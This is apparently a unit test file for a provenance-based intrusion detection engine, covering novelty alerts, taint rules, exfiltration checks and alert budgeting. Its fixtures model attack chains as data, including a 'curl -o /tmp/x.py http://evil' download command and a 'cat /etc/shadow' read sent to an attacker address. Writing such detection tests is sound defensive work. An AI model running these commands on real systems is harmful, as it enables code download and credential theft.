"""Detection layers 1-2 (pdp_engine.layers), the runtime's layered alert policy and detector-1's degree input.
Run in the server or agent image: PYTHONPATH=engine python tests/unit/test_layers.py"""
import sys

import numpy as np

from pdp_engine.layers import DeterministicLayers, NoveltyLayer, TagEngine, TagParams, dir_key, executable, fit_layers
from pdp_engine.schema import EDGE_TYPE_ID as ET, Entity, Registry
from pdp_engine.windows import Window

fails = 0


def check(cond, msg):
    global fails
    print(("PASS " if cond else "FAIL ") + msg)
    fails += 0 if cond else 1


def win(edges, t0=0):
    """edges: (src, op, dst[, t]) with dense ids; one window."""
    src = np.array([e[0] for e in edges], dtype=np.int64); dst = np.array([e[2] for e in edges], dtype=np.int64)
    t = np.array([e[3] if len(e) > 3 else t0 + i for i, e in enumerate(edges)], dtype=np.int64)
    et = np.array([ET[e[1]] for e in edges], dtype=np.int64)
    return Window(int(t.min()), int(t.max()), src, dst, t, et, [str(i) for i in range(len(edges))])


# ---------------------------------------------------------------- label helpers
check(executable("subject /usr/bin/python3 python3 -m x") == "/usr/bin/python3", "executable: path")
check(executable("subject None sh -c ls") == "sh", "executable: CADETS process name when the path is missing")
check(executable("subject None None") == "None", "executable: nothing recorded")
check(dir_key("/home/admin/.ssh/authorized_keys") == "/home/admin" and dir_key("/etc/passwd") == "/etc" and dir_key("None") == "None",
      "dir_key truncates to two directory components")

# ---------------------------------------------------------------- registry used below
reg = Registry()
ids = {}
for name, e in [("nginx", Entity.process("p:nginx", "/usr/sbin/nginx", "nginx")), ("worker", Entity.process("p:worker", "/usr/sbin/nginx", "nginx")),
                ("sh_file", Entity.file("f:sh", "/bin/sh")), ("attacker", Entity.socket("n:att", "81.49.200.166", 80)),
                ("client", Entity.socket("n:cli", "10.0.0.5", 443)), ("shadow", Entity.file("f:shadow", "/etc/shadow")),
                ("bashrc", Entity.file("f:bashrc", "/home/u/.bashrc")),
                ("drop", Entity.file("f:drop", "/tmp/.x")), ("implant", Entity.process("p:impl", "/tmp/.x", "/tmp/.x")),
                ("shproc", Entity.process("p:sh", "/bin/sh", "sh")), ("cat", Entity.process("p:cat", "/bin/cat", "cat")),
                ("oneoff", Entity.socket("n:one", "198.51.100.7", 80))]:
    ids[name] = reg.add(e)
I = ids
N_PRE = I["drop"]          # every entity registered before the dropped file existed during the baseline

# ---------------------------------------------------------------- layer 1
nov = NoveltyLayer({"/usr/sbin/nginx", "/bin/sh", "/bin/cat"})
w = win([(I["sh_file"], "EXECUTE", I["shproc"]), (I["drop"], "EXECUTE", I["implant"])])
h = nov.process(w, reg, w.nodes())
check([x.nodes for x in h] == [(I["implant"],)] and h[0].rule == "novel_executable" and h[0].key == "/tmp/.x", "novelty flags only the unseen program")
check(nov.process(w, reg, w.nodes()) == [], "novelty alerts once per process")
nov2 = NoveltyLayer({"/usr/sbin/nginx", "/bin/sh"}, approved={"/tmp/.x", "/bin/cat"})
check(nov2.process(w, reg, w.nodes()) == [], "approved programs are not flagged")
r2 = Registry(); u = r2.add(Entity.process("p:u", None, None)); f2 = r2.add(Entity.file("f:none", None))
wu = win([(f2, "READ", u)])
check(NoveltyLayer(set()).process(wu, r2, wu.nodes()) == [], "a process with no recorded program is missing data, not a novel program")


def engine(thr=None, trusted=("10.0.0.5",), **kw):
    return TagEngine(TagParams(**kw), set(trusted), thr, N_PRE)


# ---------------------------------------------------------------- layer 2, DARPA layout (one node per process, fork then exec)
attack = [(I["attacker"], "RECVFROM", I["nginx"]), (I["nginx"], "CLONE", I["worker"]), (I["sh_file"], "EXECUTE", I["worker"]),
          (I["worker"], "WRITE", I["drop"]), (I["drop"], "EXECUTE", I["implant"]), (I["implant"], "CONNECT", I["attacker"])]
eng = engine()
hits = eng.process(win(attack), reg)
rules = {x.rule for x in hits}
check({"tainted_spawn", "untrusted_exec", "untrusted_code_network"} <= rules, f"exploited server: spawn, dropped exec, C2 ({sorted(rules)})")
check("tainted_modify" not in rules, "writing a file that did not exist in the baseline is not 'modify'")
sp = next(x for x in hits if x.rule == "tainted_spawn")
check(sp.key == "/usr/sbin/nginx -> /bin/sh" and "81.49.200.166" in sp.detail, f"spawn key = parent -> program, explained by its source ({sp.detail})")
benign = [(I["client"], "RECVFROM", I["nginx"]), (I["nginx"], "CLONE", I["worker"]), (I["sh_file"], "EXECUTE", I["worker"])]
check(engine().process(win(benign), reg) == [], "the same activity from a trusted (baseline) address raises nothing")

# ---------------------------------------------------------------- live layout (new node per exec image: EXECUTE first, then CLONE)
live = [(I["attacker"], "RECVFROM", I["nginx"]), (I["sh_file"], "EXECUTE", I["shproc"]), (I["nginx"], "CLONE", I["shproc"])]
h = engine().process(win(live), reg)
check([x.rule for x in h] == ["tainted_spawn"] and h[0].key == "/usr/sbin/nginx -> /bin/sh", "live collectors: tainted spawn found at the CLONE")

# ---------------------------------------------------------------- modify / exfiltration / decay
h = engine().process(win([(I["attacker"], "RECVFROM", I["cat"]), (I["cat"], "WRITE", I["bashrc"])]), reg)
check([x.rule for x in h] == ["tainted_modify"] and h[0].nodes == (I["cat"], I["bashrc"]), "untrusted input modifying a baseline file")
h = engine().process(win([(I["shadow"], "READ", I["cat"]), (I["cat"], "CONNECT", I["attacker"])]), reg)
check([x.rule for x in h] == ["exfiltration"], "credential store read then sent to an untrusted address")
check(engine().process(win([(I["shadow"], "READ", I["cat"]), (I["cat"], "CONNECT", I["client"])]), reg) == [], "... but not to a baseline address")
# ---------------------------------------------------------------- console allow list
e_allow = engine(); e_allow.set_allowed_addresses(["81.49.200.0/24"])
check(e_allow.process(win([(I["shadow"], "READ", I["cat"]), (I["cat"], "CONNECT", I["attacker"])]), reg) == [],
      "an allow-listed network is trusted: no exfiltration alarm to it")
check([x.rule for x in engine().process(win([(I["shadow"], "READ", I["cat"]), (I["cat"], "CONNECT", I["attacker"])]), reg)] == ["exfiltration"],
      "... and the same flow still alarms without the entry")
from pdp_engine.layers import DeterministicLayers
spec = {"known_executables": ["/usr/sbin/nginx", "/bin/sh", "/bin/cat"], "trusted_ips": ["10.0.0.5"], "thresholds": {}, "config": {}}
dl = DeterministicLayers(spec, N_PRE)
dl.set_allowlist(suppressed=[("untrusted_exec", "/tmp/.x"), ("novel_executable", "/tmp/.x")])
rs = {x.rule for x in dl.process(win(attack), reg, win(attack).nodes())}
check("untrusted_exec" not in rs and "novel_executable" not in rs and "untrusted_code_network" in rs,
      f"suppressed (rule, key) detections are dropped, other detections remain ({sorted(rs)})")
H = 3600 * 10**9
late = [(I["attacker"], "RECVFROM", I["nginx"], 0), (I["nginx"], "CLONE", I["worker"], 5 * H), (I["sh_file"], "EXECUTE", I["worker"], 5 * H + 1)]
check(engine().process(win(late), reg) == [], "untrusted data integrity recovers after 5 half-lives (no spawn alarm)")
check(any(x.rule == "tainted_spawn" for x in engine(half_life_s=0).process(win(late), reg)), "... and persists without decay")

# ---------------------------------------------------------------- benign-calibrated thresholds
thr = {"tainted_spawn": {"/usr/sbin/nginx -> /bin/sh": -0.05}}
h = engine(thr).process(win(attack), reg)
check("tainted_spawn" not in {x.rule for x in h} and "untrusted_exec" in {x.rule for x in h},
      "a key seen on benign data stays quiet; the other alarms still fire")


class Store:    # minimal WindowStore stand-in: day -> windows
    def __init__(self, days):
        self.d = days

    def windows(self, day):
        return iter(self.d[day])


# day 1: a one-off address and nginx spawns sh (benign routine); days 2-3: a recurring address
days = {"d1": [win([(I["oneoff"], "RECVFROM", I["nginx"]), (I["nginx"], "CLONE", I["worker"]), (I["sh_file"], "EXECUTE", I["worker"])])],
        "d2": [win([(I["client"], "RECVFROM", I["nginx"])])], "d3": [win([(I["client"], "RECVFROM", I["worker"])])]}
spec = fit_layers(Store(days), ["d1", "d2", "d3"], reg, N_PRE, log=lambda m: None)
check(set(spec["trusted_ips"]) == {"198.51.100.7", "10.0.0.5"}, "fit: baseline addresses become trusted for deployment")
check("/usr/sbin/nginx -> /bin/sh" in spec["thresholds"].get("tainted_spawn", {}),
      "fit is leave-one-day-out: a one-day address is untrusted in calibration, so the benign spawn key is learned")
# DARPA-style process nodes keep their label across exec: the worker is still 'nginx'
check(spec["known_executables"] == ["/usr/sbin/nginx"], f"fit: known executables {spec['known_executables']}")
L = DeterministicLayers(spec, N_PRE)
wa = win(attack)
got = {(x.layer, x.rule) for x in L.process(wa, reg, wa.nodes())}
check(("novelty", "novel_executable") in got and ("rules", "untrusted_exec") in got and ("rules", "tainted_spawn") not in got,
      f"layers object runs both layers with the fitted thresholds ({sorted(got)})")

# ---------------------------------------------------------------- re-assigned private addresses (docker, DHCP)
from pdp_engine.layers import TagEngine, TagParams
te = TagEngine(TagParams(), {"172.18.0.4", "8.8.8.8", "10.0.5.1"}, {}, N_PRE)
check(te._private_trusted("172.18.0.10") and te._private_trusted("10.0.5.77"), "a private address in a trusted private /24 is trusted (new container IP)")
check(not te._private_trusted("172.18.1.10") and not te._private_trusted("8.8.8.9") and not te._private_trusted("192.168.1.1"),
      "other private /24s and neighbours of public addresses are not")

# ---------------------------------------------------------------- a program's private services on new addresses
r3 = Registry()
J = {k: r3.add(e) for k, e in [("ngx", Entity.process("p:ngx", "/usr/sbin/nginx", "nginx")), ("ngx2", Entity.process("p:ngx2", "/usr/sbin/nginx", "nginx")),
                                ("key", Entity.file("f:key", "/etc/ssl/private/site.key")), ("old", Entity.socket("n:old", "172.18.0.5", 8000)),
                                ("new", Entity.socket("n:new", "172.22.0.5", 8000)), ("ssh", Entity.socket("n:ssh", "172.22.0.5", 22)),
                                ("curl", Entity.process("p:curl", "/usr/bin/curl", "curl")), ("pub", Entity.socket("n:pub", "203.0.113.9", 8000))]}
bdays = {f"d{k}": [win([(J["ngx"], "CONNECT", J["old"])])] for k in (1, 2)}
sp = fit_layers(Store(bdays), ["d1", "d2"], r3, len(r3), log=lambda m: None)
check(sp["private_services"] == ["/usr/sbin/nginx|8000"], f"fit: private services per program and port {sp['private_services']}")
L3 = DeterministicLayers(sp, len(r3))
leak = lambda dst, prog="ngx2": {x.rule for x in L3.process(win([(J["key"], "READ", J[prog]), (J[prog], "CONNECT", J[dst])]), r3, np.array([J[prog], J[dst]]))}
check("exfiltration" not in leak("new"), "nginx to a new docker address on its baseline port: no alarm (re-assigned container)")
L3 = DeterministicLayers(sp, len(r3))
check("exfiltration" in leak("ssh"), "the same new address on another port still alarms")
L3 = DeterministicLayers(sp, len(r3))
check("exfiltration" in leak("new", "curl"), "another program to that address still alarms")
L3 = DeterministicLayers(sp, len(r3))
check("exfiltration" in leak("pub"), "public addresses are never covered")

# ---------------------------------------------------------------- 0.4: program identity, Windows paths, multicast
from pdp_engine.layers import canonical_path, is_local, program_key, program_name
check(program_key("/Device/HarddiskVolume1/Windows/system32/PING.EXE") == program_key("C:\\Windows\\System32\\ping.exe") == "/windows/system32/ping.exe",
      "program_key: NT / drive form and letter case are one program")
check(program_key("/Device/HarddiskVolume1/Users/u/AppData/Local/Temp/6AF1D27F-4E9B-4CC9-893B-A94562310056/dismhost.exe")
      == program_key("/??/C:/Users/U/AppData/Local/Temp/DFA4EC0F-A962-458E-AEA8-7816754774A9/dismhost.exe") == "/users/u/appdata/local/temp/{id}/dismhost.exe",
      "program_key: per-run GUID directories")
check(program_key("C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe") == "/windows/microsoft.net/framework64/{v}/csc.exe"
      and program_key("/opt/app/1.2.3/bin/app") == "/opt/app/{v}/bin/app", "program_key: version directories")
check(program_key("/usr/bin/python3") == "/usr/bin/python3" and program_key("/tmp/x/1.2") == "/tmp/x/1.2", "program_key: plain paths and file names unchanged")
check(program_name(program_key("C:/Windows/System32/taskkill.exe")) == "taskkill", "program_name: bare name without .exe")
pf = 'subject /Device/HarddiskVolume1/Program Files (x86)/Google/Update/GoogleUpdate.exe "C:/Program Files (x86)/Google/Update/GoogleUpdate.exe" /svc'
check(executable(pf, True) == "/Device/HarddiskVolume1/Program Files (x86)/Google/Update/GoogleUpdate.exe" and executable(pf) == "/Device/HarddiskVolume1/Program",
      "executable(full_paths): a Windows path with spaces is read in full (0.3 cut it at the first space)")
check(executable("subject /Device/HarddiskVolume1/Program Files/Adobe/Reader 9.0/Reader/AcroRd32.exe None", True).endswith("Reader 9.0/Reader/AcroRd32.exe"),
      "executable(full_paths): several spaces")
check(executable("subject /usr/bin/python3 python3 -m x", True) == "/usr/bin/python3" and executable("subject None links http://x", True) == "links",
      "executable(full_paths): Linux paths and path-less names unchanged")
check(canonical_path("/Device/HarddiskVolume1/Users/X/f.txt") == canonical_path("C:\\Users\\x\\F.TXT") == "/users/x/f.txt"
      and canonical_path("/home/A/f") == "/home/A/f", "canonical_path: Windows spellings unified, Linux paths unchanged")
check(dir_key(canonical_path("/Device/HarddiskVolume1/Windows/System32/drivers/x.sys")) == "/windows/system32",
      "dir_key on canonical Windows paths: the real folders, not '/Device/HarddiskVolume1'")
check(not is_local("ff02::1:ffdb:8ae2") and not is_local("224.0.0.252") and is_local("ff02::1:ffdb:8ae2", True)
      and is_local("224.0.0.252", True) and is_local("255.255.255.255", True) and not is_local("8.8.8.8", True),
      "is_local(multicast=True): multicast and limited broadcast are local traffic, public addresses are not")

# ---------------------------------------------------------------- 0.4: layer-1 program matching and repeat runs
rw = Registry()
K = {k: rw.add(e) for k, e in [
    ("ping", Entity.process("w:ping", "/Device/HarddiskVolume1/Windows/system32/PING.EXE", None)),
    ("dism", Entity.process("w:dism", "/Device/HarddiskVolume1/Windows/TEMP/4B6DC4D2-FC04-4FC2-B07D-0E9C719B7024/dismhost.exe", None)),
    ("tk", Entity.process("w:tk", None, "taskkill /f /im x.exe")),
    ("pf", Entity.process("w:pf", "/Device/HarddiskVolume1/Program Files/NewVendor/tool.exe", None)),
    ("n1", Entity.process("w:n1", "/Device/HarddiskVolume1/Users/u/new.exe", None)),
    ("n2", Entity.process("w:n2", "/Device/HarddiskVolume1/Users/u/new.exe", None)),
    ("n3", Entity.process("w:n3", "/Device/HarddiskVolume1/Users/u/NEW.exe", None)),
    ("n4", Entity.process("w:n4", "/Device/HarddiskVolume1/Users/u/new.exe", None)),
    ("f", Entity.file("w:f", "/Device/HarddiskVolume1/x"))]}
known = {"C:/Windows/System32/ping.exe", "/Device/HarddiskVolume1/Windows/TEMP/AFF50783-6B63-4309-8613-21C87FD93118/dismhost.exe",
         "/Device/HarddiskVolume1/Windows/system32/taskkill.exe", "/Device/HarddiskVolume1/Program Files/OldVendor/app.exe"}
wk = win([(K["f"], "READ", K[k]) for k in ("ping", "dism", "tk", "pf")])
got03 = {h.key for h in NoveltyLayer(known).process(wk, rw, wk.nodes())}
got04 = {h.key for h in NoveltyLayer(known, normalize=True, full_paths=True).process(wk, rw, wk.nodes())}
check(got03 >= {"/Device/HarddiskVolume1/Windows/system32/PING.EXE", "taskkill"}, f"0.3: other spellings of known programs alert ({sorted(got03)})")
check(got04 == {"/Device/HarddiskVolume1/Program Files/NewVendor/tool.exe"},
      f"0.4: case, GUID directory and path-less name match known programs; a new Program Files program alerts ({sorted(got04)})")
D = 86_400 * 10**9
nv = NoveltyLayer(set(), normalize=True, instances=1)
w1 = win([(K["f"], "READ", K["n1"], 1), (K["f"], "READ", K["n2"], 2), (K["f"], "READ", K["n3"], 3)])
hr = nv.process(w1, rw, w1.nodes())
check([h.rule for h in hr] == ["novel_executable", "novel_executable_repeat", "novel_executable_repeat"],
      f"novel_instances=1: one alert per new program and day, later runs (any spelling) are repeats ({[h.rule for h in hr]})")
w2 = win([(K["f"], "READ", K["n4"], D + 5)])
check([h.rule for h in nv.process(w2, rw, w2.nodes())] == ["novel_executable"], "... and the program alerts again the next day")
check(len(NoveltyLayer(set()).process(w1, rw, w1.nodes())) == 3 and all(h.rule == "novel_executable" for h in NoveltyLayer(set()).process(w1, rw, w1.nodes())),
      "0.3 behaviour (instances=0): every process alerts")
check(NoveltyLayer(set(), approved={"C:/Users/U/new.exe"}, normalize=True).process(w1, rw, w1.nodes()) == [],
      "an approved program covers every spelling of it")
dls = DeterministicLayers({"known_executables": [], "trusted_ips": [], "thresholds": {}, "config": {"normalize_programs": True, "novel_instances": 1}}, 0)
dls.set_allowlist(suppressed=[("novel_executable", "/Device/HarddiskVolume1/Users/u/new.exe")])
check([h.key for h in dls.process(w1, rw, w1.nodes())] == ["/Device/HarddiskVolume1/Users/u/NEW.exe"],
      "a suppressed new program also suppresses its repeat runs (other spellings keep their own key)")

# ---------------------------------------------------------------- 0.4: Windows-layout data flow (no EXECUTE events)
rv = Registry()
V = {k: rv.add(e) for k, e in [
    ("c2", Entity.socket("v:c2", "203.0.113.50", 443)), ("mc", Entity.socket("v:mc", "ff02::1:ffdb:8ae2", 0)),
    ("browser", Entity.process("v:br", "/Device/HarddiskVolume1/Program Files/Mozilla Firefox/firefox.exe", None)),
    ("explorer", Entity.process("v:ex", "/Device/HarddiskVolume1/Windows/explorer.exe", None)),
    ("svc", Entity.process("v:svc", "/Device/HarddiskVolume1/Windows/System32/svchost.exe", None)),
    ("cfg", Entity.file("v:cfg", "/Device/HarddiskVolume1/Windows/System32/config.dat")),
    ("cred", Entity.file("v:cred", "/Device/HarddiskVolume1/Users/u/AppData/Roaming/Microsoft/Credentials/DFBE70A7E5CC19A3")),
    ("dl", Entity.file("v:dl", "/Device/HarddiskVolume1/Users/u/Downloads/invoice.exe")),
    ("implant", Entity.process("v:im", "/Device/HarddiskVolume1/Users/u/Downloads/invoice.exe", None))]}
NPV = V["dl"]      # files registered before the download existed in the baseline
drop = [(V["c2"], "RECVMSG", V["browser"]), (V["browser"], "WRITE", V["dl"]), (V["explorer"], "CLONE", V["implant"]),
        (V["implant"], "CONNECT", V["c2"])]
te04 = lambda **kw: TagEngine(TagParams(), set(), {}, NPV, full_paths=True, **kw)
r_img = {h.rule for h in te04(image_exec=True).process(win(drop), rv)}
r_noimg = {h.rule for h in te04().process(win(drop), rv)}
check({"untrusted_exec", "untrusted_code_network"} <= r_img and not ({"untrusted_exec", "untrusted_code_network"} & r_noimg),
      f"image_exec: starting a downloaded program counts as executing it (with {sorted(r_img)}, without {sorted(r_noimg)})")
mcast = [(V["mc"], "RECVMSG", V["svc"]), (V["svc"], "WRITE", V["cfg"])]
check([h.rule for h in te04().process(win(mcast), rv)] == ["tainted_modify"] and te04(local_multicast=True).process(win(mcast), rv) == [],
      "local_multicast: a process receiving IPv6 neighbour-discovery multicast is not tainted (0.3 flagged its writes)")
cred = [(V["cred"], "READ", V["explorer"]), (V["explorer"], "CONNECT", V["c2"])]
check([h.rule for h in te04().process(win(cred), rv)] == ["exfiltration"]
      and TagEngine(TagParams(), set(), {}, NPV).process(win(cred), rv) == [],
      "full_paths: Windows credential stores are sensitive (exfiltration), 0.3 knew only Linux stores")
tm = [h for h in te04().process(win([(V["c2"], "RECVMSG", V["svc"]), (V["svc"], "WRITE", V["cfg"])]), rv) if h.rule == "tainted_modify"]
check(tm and tm[0].key.endswith("@ /windows/system32"), f"full_paths: tainted_modify keys use the real folder ({tm[0].key if tm else None})")
sp04 = fit_layers(Store({"d1": [win([(V["c2"], "RECVMSG", V["svc"])])]}), ["d1"], rv, NPV, log=lambda m: None)
check(all(sp04["config"].get(k) for k in ("normalize_programs", "full_paths", "image_exec", "local_multicast")) and sp04["config"]["novel_instances"] == 1,
      "new fits record the 0.4 settings in layers.json")
old = DeterministicLayers({"known_executables": [], "trusted_ips": [], "thresholds": {}, "config": {}}, NPV)
check(not old.novelty.normalize and old.novelty.instances == 0 and not old.tags.full_paths and not old.tags.image_exec and not old.tags.local_multicast,
      "a layers.json fitted by 0.3 (no 0.4 keys) keeps the 0.3 behaviour until re-fitted")

# ---------------------------------------------------------------- runtime alert policy (budget, corroboration)
try:
    from pdp_engine.runtime import AlertPolicy  # noqa: F401
except ImportError as e:
    print(f"SKIP runtime policy ({e})")
else:
    from pdp_engine.runtime import AlertPolicy
    rt = AlertPolicy(DeterministicLayers(spec, N_PRE), daily_budget=2, corroboration=0.5)
    rt._alert_policy = lambda w, i, f: rt.apply(w, reg, i, f)
    w = win(attack)
    ids_ = w.nodes()
    fused = np.full(len(ids_), 0.1); pos = {int(n): i for i, n in enumerate(ids_)}
    fused[pos[I["attacker"]]] = 0.7                       # neighbour of the implant, above the corroboration level
    fused[pos[I["nginx"]]] = 3.0; fused[pos[I["sh_file"]]] = 2.0; fused[pos[I["worker"]]] = 1.5   # learned-only candidates
    al, rs, hits = rt._alert_policy(w, ids_, fused)
    lay = {n: rs[n][0]["layer"] for n in rs}
    check(lay.get(I["implant"]) in ("novelty", "rules") and lay.get(I["drop"]) == "rules", "deterministic alerts carry their layer")
    check(lay.get(I["attacker"]) in ("rules", "corroborated"), "C2 address: flagged by a rule or corroborated")
    learned = [n for n, l in lay.items() if l == "learned"]
    check(len(learned) <= 2 and I["nginx"] in learned or lay.get(I["nginx"]) in ("rules", "corroborated"), f"learned-only alerts within the daily budget ({lay})")
    al2, rs2, _ = rt._alert_policy(win([(I["client"], "RECVFROM", I["cat"])], t0=10), np.array([I["client"], I["cat"]]), np.array([5.0, 5.0]))
    check(sum(1 for n in rs2 if rs2[n][0]["layer"] == "learned") == 0, "budget is shared across the day's windows (exhausted)")
    rt._alert_policy(win([(I["client"], "RECVFROM", I["cat"])], t0=86_400 * 10**9), np.array([I["client"], I["cat"]]), np.array([5.0, 5.0]))
    check(rt._day_learned >= 1, "... and resets the next day")
    # evidence rules (tainted spawn / modify) alert only when the learned score corroborates them
    bare = {"known_executables": ["/usr/sbin/nginx", "/bin/sh", "/bin/cat", "/tmp/.x"], "trusted_ips": ["10.0.0.5"], "thresholds": {}}
    wl = win(live); il = wl.nodes(); pl = {int(n): i for i, n in enumerate(il)}
    lo = np.full(len(il), 0.1); hi = lo.copy(); hi[pl[I["shproc"]]] = 0.9
    _, r_lo, h_lo = AlertPolicy(DeterministicLayers(bare, N_PRE), 0, 0.5).apply(wl, reg, il, lo)
    _, r_hi, _ = AlertPolicy(DeterministicLayers(bare, N_PRE), 0, 0.5).apply(wl, reg, il, hi)
    check([h.rule for h in h_lo] == ["tainted_spawn"] and I["shproc"] not in r_lo, "evidence rule alone does not alert")
    check(r_hi.get(I["shproc"], [{}])[0].get("layer") == "corroborated" and [x["layer"] for x in r_hi[I["shproc"]][1:]] == ["evidence"],
          "evidence rule + learned score above the corroboration level alerts (the rule hit is kept as evidence)")
    pol_off = AlertPolicy(DeterministicLayers(bare, N_PRE), 5, 0.5); pol_off.learned_alerts = False
    _, r_off, _ = pol_off.apply(wl, reg, il, hi * 10)
    check(all(x[0]["layer"] in ("novelty", "rules") for x in r_off.values()), "learned_alerts off: only layer-1/2 alerts")
    # early models: only the allowed layers alert (rules only on hours of baseline)
    pe = AlertPolicy(DeterministicLayers(spec, N_PRE), daily_budget=5, corroboration=0.5); pe.alert_layers = {"rules"}
    _, r_e, h_e = pe.apply(w, reg, ids_, fused)
    check(r_e and all(any(x["layer"] == "rules" for x in rs_) for rs_ in r_e.values())
          and not any(x["layer"] in ("corroborated", "learned") for rs_ in r_e.values() for x in rs_)
          and any(h.layer == "novelty" for h in h_e), f"alert_layers={{'rules'}}: novelty and learned hits are kept as hits but do not alert ({sorted(r_e)})")
    pe2 = AlertPolicy(DeterministicLayers(spec, N_PRE), daily_budget=5, corroboration=0.5); pe2.alert_layers = {"rules", "novelty", "corroborated", "learned"}
    check(sorted(pe2.apply(w, reg, ids_, fused)[1]) == sorted(AlertPolicy(DeterministicLayers(spec, N_PRE), 5, 0.5).apply(w, reg, ids_, fused)[1]),
          "alert_layers with every layer = the full policy")
    _, r_pre, _ = AlertPolicy(DeterministicLayers(bare, N_PRE), 0, 0.5, evidence_rules=()).apply(wl, reg, il, lo)
    check(r_pre.get(I["shproc"], [{}])[0].get("layer") == "rules", "pre-registered policy (no evidence rules): the rule alerts on its own")
    # 0.4: repeat runs of a new program are evidence; triage severity; forward-only corroboration
    from pdp_engine.runtime import alert_tier
    pr = AlertPolicy(DeterministicLayers({"known_executables": [], "trusted_ips": [], "thresholds": {},
                                          "config": {"normalize_programs": True, "novel_instances": 1}}, 0), 0, 0.5, evidence_rules=())
    il1 = w1.nodes(); _, r_rep, _ = pr.apply(w1, rw, il1, np.zeros(len(il1)))
    check(sorted(r_rep) == [K["n1"]], "novel_executable_repeat is evidence even with no evidence rules configured")
    R = lambda layer, rule: {"layer": layer, "rule": rule}
    check(alert_tier([R("rules", "exfiltration")]) == 4 and alert_tier([R("rules", "untrusted_code_network")]) == 4
          and alert_tier([R("rules", "untrusted_exec")]) == 3 and alert_tier([R("novelty", "novel_executable"), R("rules", "tainted_spawn")]) == 3
          and alert_tier([R("novelty", "novel_executable")]) == 2 and alert_tier([R("corroborated", "learned_near_alert")]) == 2
          and alert_tier([R("learned", "learned_score")]) == 1 and alert_tier([]) == 0,
          "alert_tier grades nodes like the console grades incidents (critical > high > medium > low)")
    wf = win([(I["shadow"], "READ", I["cat"]), (I["cat"], "CONNECT", I["attacker"]), (I["client"], "RECVFROM", I["cat"])])
    fi = wf.nodes(); hi_all = np.full(len(fi), 0.9)
    pw = AlertPolicy(DeterministicLayers(bare, N_PRE), 0, 0.5); pf_ = AlertPolicy(DeterministicLayers(bare, N_PRE), 0, 0.5); pf_.corroboration_scope = "forward"
    rw_, rf_ = pw.apply(wf, reg, fi, hi_all)[1], pf_.apply(wf, reg, fi, hi_all)[1]
    check(I["shadow"] in rw_ and I["client"] in rw_ and I["shadow"] not in rf_ and I["client"] not in rf_,
          "corroboration_scope=forward: only what the alerted process affected, not what flowed into it")
    # 0.8.1: near-alert corroboration on the neighbour's own score (propagated suspicion from the alert is circular)
    pown = AlertPolicy(DeterministicLayers(bare, N_PRE), 0, 0.5)
    r_own0 = pown.apply(wf, reg, fi, hi_all, own=np.zeros(len(fi)))[1]
    r_own1 = AlertPolicy(DeterministicLayers(bare, N_PRE), 0, 0.5).apply(wf, reg, fi, hi_all, own=hi_all)[1]
    pfin = AlertPolicy(DeterministicLayers(bare, N_PRE), 0, 0.5); pfin.near_alert_score = "final"
    r_fin = pfin.apply(wf, reg, fi, hi_all, own=np.zeros(len(fi)))[1]
    check(pown.near_alert_score == "own" and I["shadow"] not in r_own0 and I["client"] not in r_own0
          and I["shadow"] in r_own1 and I["client"] in r_own1 and I["shadow"] in r_fin and I["client"] in r_fin,
          "near-alert corroboration uses the neighbour's own score (0.8.1); near_alert_score=final keeps 0.7's propagated score")
    check(I["shadow"] in rw_, "no own score passed (pre-0.7 runtimes): the fused score is used as before")
    hi1 = np.full(len(il1), 0.9)
    prc = lambda cap: AlertPolicy(DeterministicLayers({"known_executables": [], "trusted_ips": [], "thresholds": {},
                                                       "config": {"normalize_programs": True, "novel_instances": 1}}, 0), 0, 0.5, evidence_rules=())
    p0, p1 = prc(0), prc(1); p0.repeat_corroborations = 0; p1.repeat_corroborations = 1
    r_c0, r_c1 = p0.apply(w1, rw, il1, hi1)[1], p1.apply(w1, rw, il1, hi1)[1]
    cor = lambda r: sorted(n for n in r if r[n][0]["layer"] == "corroborated" and r[n][0]["rule"] == "novel_executable_repeat")
    check(cor(r_c0) == sorted([K["n2"], K["n3"]]) and len(cor(r_c1)) == 1,
          f"repeat_corroborations caps corroborated repeat runs per program and day, any spelling ({cor(r_c0)} / {cor(r_c1)})")

# ---------------------------------------------------------------- 0.6: evasion resistance
import pdp_engine.layers as LY
from pdp_engine.layers import LayerConfig, is_local, program_key
check(program_key("/tmp/fedcba9876543210") == "/tmp/{id}" and program_key("/tmp/fedcba9876543210", True) == "/tmp/fedcba9876543210",
      "strict program key: a file named like a hex id keeps its name (it used to match any hex-named baseline program)")
check(program_key("/tmp/LS", True) == "/tmp/LS" and program_key("/tmp/LS") == "/tmp/ls", "strict program key: POSIX paths keep their case")
check(program_key("/Device/HarddiskVolume1/Windows/System32/PING.EXE", True) == "/windows/system32/ping.exe"
      and program_key("C:\\Users\\a\\AppData\\Local\\Temp\\{12345678-1234-1234-1234-123456789ABC}\\DismHost.exe", True) == "/users/a/appdata/local/temp/{id}/dismhost.exe",
      "strict program key: Windows programs still case-folded, GUID directories still collapsed")
nk = NoveltyLayer({"/tmp/0123456789abcdef"}, normalize=True, strict_keys=True)
check(not nk.is_known("/tmp/fedcba9876543210") and NoveltyLayer({"/tmp/0123456789abcdef"}, normalize=True).is_known("/tmp/fedcba9876543210"),
      "strict keys: another hex-named binary in the same directory is a new program")
check(is_local("1.2.3.4%x") and not is_local("1.2.3.4%x", strict=True) and not is_local("[2001:db8::1]", strict=True)
      and is_local("NA", strict=True) and is_local("fe80::1%eth0", strict=True), "strict addresses: zone ids / brackets no longer make an address local")

r6 = Registry(); J = {}
for name, e in [("dl", Entity.process("p:dl", "/usr/bin/curl", "curl -o /tmp/x.py http://evil")), ("c2", Entity.socket("n:c2", "203.0.113.9", 443)),
                ("script", Entity.file("f:script", "/tmp/x.py")), ("py", Entity.process("p:py", "/usr/bin/python3", "python3 -u /tmp/x.py")),
                ("pyc", Entity.process("p:pyc", "/usr/bin/python3", "python3 -c print(1)")), ("pyf", Entity.file("f:py", "/usr/bin/python3")),
                ("shadow", Entity.file("f:sh6", "/etc/shadow")), ("cat", Entity.process("p:cat6", "/bin/cat", "cat /etc/shadow")),
                ("bashrc", Entity.file("f:rc6", "/home/u/.bashrc")), ("cron", Entity.file("f:cron6", "/etc/cron.d/job")),
                ("other", Entity.file("f:oth6", "/home/u/notes.txt"))]:
    J[name] = r6.add(e)


def eng6(**kw):
    return TagEngine(TagParams(), set(), {}, 0, **kw)


dl_edges = [(J["c2"], "READ", J["dl"], 1), (J["dl"], "WRITE", J["script"], 2), (J["pyf"], "EXECUTE", J["py"], 3), (J["script"], "READ", J["py"], 4),
            (J["py"], "CONNECT", J["c2"], 5)]
h_off = {x.rule for x in eng6().process(win(dl_edges), r6)}
